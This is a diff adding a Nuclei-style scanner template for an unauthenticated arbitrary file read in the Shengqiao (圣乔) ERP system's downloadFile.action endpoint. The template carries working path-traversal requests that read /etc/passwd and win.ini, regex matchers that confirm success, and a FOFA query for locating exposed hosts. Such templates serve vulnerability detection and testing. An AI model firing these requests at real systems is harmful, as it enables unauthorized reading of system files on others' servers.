@@ -1,0 +1,32 @@
+id: sqerp-downloadFile-action-fileread
+info:
+  name: 圣乔 ERP downloadFile.action - 任意文件读取
+  author: leadlife
+  severity: high
+  description: 圣乔ERP系统 downloadFile.action 存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件。
+  reference: 
+    - https://github.com/wy876/POC/blob/main/%E5%9C%A3%E4%B9%94ERP/%E5%9C%A3%E4%B9%94ERP%E7%B3%BB%E7%BB%9FdownloadFile.action%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: app="圣乔-ERP系统"
+    hunter-query: demo
+    tips:
+    repair:
+    version:
+  tags: 2024,fileread,sqerp
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/erp/wap/../downloadFile.action?absolutePath=true&file=/etc/passwd"
+      - "{{BaseURL}}/erp/wap/../downloadFile.action?absolutePath=true&file=c:/windows/win.ini"
+      
+    stop-at-first-match: true
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "\\[(font|extension|file)s\\]"
+        condition: or
